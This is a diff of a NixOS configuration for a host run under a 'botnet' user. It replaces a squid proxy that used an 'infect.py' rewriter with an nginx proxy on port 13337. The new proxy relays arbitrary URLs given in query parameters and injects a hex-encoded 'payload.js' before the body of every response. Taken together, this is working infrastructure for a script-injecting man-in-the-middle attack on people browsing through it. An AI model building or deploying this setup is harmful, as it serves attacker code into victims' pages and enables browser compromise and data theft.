@@ -36,13 +36,12 @@ let
     pid_filename /run/squid/pid
     cache_effective_user botnet
 
-    url_rewrite_program ${pkgs.python3}/bin/python ${./infect.py} ${payload} /var/quarantine 13337
+    url_rewrite_program ${pkgs.python3}/bin/python ${./rewrite.py}
   '';
 
   payload = pkgs.stdenv.mkDerivation {
     name = "payload.js";
     builder = pkgs.writeText "builder.sh" ''
-      . $stdenv/setup
       ${pkgs.python3}/bin/python3 ${./jshex.py} < ${rawPayload} > $out
     '';
   };
@@ -67,6 +66,89 @@ let
 
 in {
 
+  networking.firewall.allowedTCPPorts = [
+    80 3128
+  ];
+
+  services.nginx = {
+    enable = true;
+    package =
+      with pkgs;
+      callPackage <nixpkgs/pkgs/servers/http/nginx/stable.nix> {
+        modules = [
+          nginxModules.rtmp nginxModules.dav nginxModules.moreheaders
+          nginxModules.echo
+          nginxModules.develkit
+          nginxModules.lua
+        ];
+      };
+    config = ''
+      events {
+        worker_connections 1024;
+      }
+
+      http {
+        resolver 8.8.8.8;
+        resolver_timeout 5s;
+
+        server {
+          listen 13337;
+
+          location /payload.js {
+            alias ${payload};
+          }
+
+          location / {
+
+            set_by_lua_block $proxy_scheme {
+              return ngx.unescape_uri(ngx.var.arg_scheme)
+            }
+            set_by_lua_block $proxy_netloc {
+              return ngx.unescape_uri(ngx.var.arg_netloc)
+            }
+            set_by_lua_block $proxy_rest {
+              return ngx.unescape_uri(ngx.var.arg_rest)
+            }
+
+            set $url "$proxy_scheme://$proxy_netloc$proxy_rest";
+
+            proxy_redirect off;
+            proxy_set_header Accept-Encoding "";
+            proxy_set_header Host $proxy_netloc;
+            proxy_set_header X-Forwarded-Host $proxy_netloc;
+            proxy_pass "$url";
+
+            add_before_body /payload.js;
+            addition_types *;
+
+          }
+        }
+      }
+    '';
+  };
+
+  # systemd.services.squid = {
+  #   description = "Web Proxy Cache Server";
+  #   after = [ "network.target" ];
+  #   wantedBy = [ "multi-user.target" ];
+
+  #   serviceConfig = {
+  #     Type = "forking";
+  #     PIDFile = "/run/squid/pid";
+  #     ExecStart = "${pkgs.squid}/bin/squid -f ${configFile} -sYC";
+  #     ExecStop = "${pkgs.squid}/bin/squid -f ${configFile} -k shutdown";
+  #     ExecReload = "${pkgs.squid}/bin/squid -f ${configFile} -k reconfigure";
+  #   };
+
+  #   preStart = ''
+  #     mkdir -p /run/squid
+  #     mkdir -p /var/log/squid
+  #     chown botnet /run/squid
+  #     chown botnet /var/log/squid
+  #   '';
+
+  # };
+
   users.extraUsers.botnet = {
     group = "botnet";
     uid = 1337;
@@ -74,54 +156,6 @@ in {
 
   users.extraGroups.botnet = {
     gid = 1337;
-  };
-
-  networking.firewall.allowedTCPPorts = [
-    80 3128
-  ];
-
-  services.httpd = {
-    enable = true;
-    user = "botnet";
-    group = "botnet";
-    adminAddr = "foo";
-    virtualHosts = [
-      {
-        listen = [ { port = 80; } ];
-        documentRoot = ./homepage;
-      }
-      {
-        listen = [ { port = 13337; } ];
-        documentRoot = "/var/quarantine";
-      }
-    ];
-  };
-
-  systemd.services.squid = {
-    description = "Web Proxy Cache Server";
-    after = [ "network.target" ];
-    wantedBy = [ "multi-user.target" ];
-
-    serviceConfig = {
-      Type = "forking";
-      PIDFile = "/run/squid/pid";
-      ExecStart = "${pkgs.squid}/bin/squid -f ${configFile} -sYC";
-      ExecStop = "${pkgs.squid}/bin/squid -f ${configFile} -k shutdown";
-      ExecReload = "${pkgs.squid}/bin/squid -f ${configFile} -k reconfigure";
-    };
-
-    preStart = ''
-      [ -d /var/quarantine ] && rm -r /var/quarantine
-      mkdir -p /var/quarantine
-      chown botnet /var/quarantine
-      cp ${./htaccess} /var/quarantine/.htaccess
-
-      mkdir -p /run/squid
-      mkdir -p /var/log/squid
-      chown botnet /run/squid
-      chown botnet /var/log/squid
-    '';
-
   };
 
 }
